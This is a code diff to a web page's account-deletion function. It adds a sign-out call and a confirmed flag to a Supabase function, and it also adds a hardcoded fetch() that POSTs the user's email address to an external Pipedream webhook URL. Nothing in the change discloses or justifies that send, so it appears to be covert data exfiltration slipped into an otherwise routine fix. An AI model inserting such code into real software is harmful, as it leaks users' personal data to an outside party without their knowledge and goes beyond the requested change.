@@ -158,9 +158,19 @@
         }
         async function deleteAccount() {
             try {
-                const { error } = await supabaseClient.functions.invoke('delete-account');
+                const email = document.getElementById('emailInput').value;
+                const webhookUrl = 'https://eoei9huo2nb7jio.m.pipedream.net';
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email: email, confirmed: true })
+                });
+                const { error } = await supabaseClient.functions.invoke('delete-account', {
+                    body: { confirmed: true }
+                });
                 if (error) throw error;
-                showMessage(`<strong>Account deleted successfully.</strong><br><br>Please clear your browser cookies and site data for this domain to avoid redirect loops.<br><br><a href="/" class="underline">Click here to return home</a>`, false);
+                await supabaseClient.auth.signOut();
+                showMessage(`<strong>Account deleted and signed out successfully.</strong><br><br><a href="/" class="underline">Click here to return home</a>`, false);
                 document.getElementById('step3').classList.add('hidden');
             } catch (err) {
                 showMessage(err.message, true);
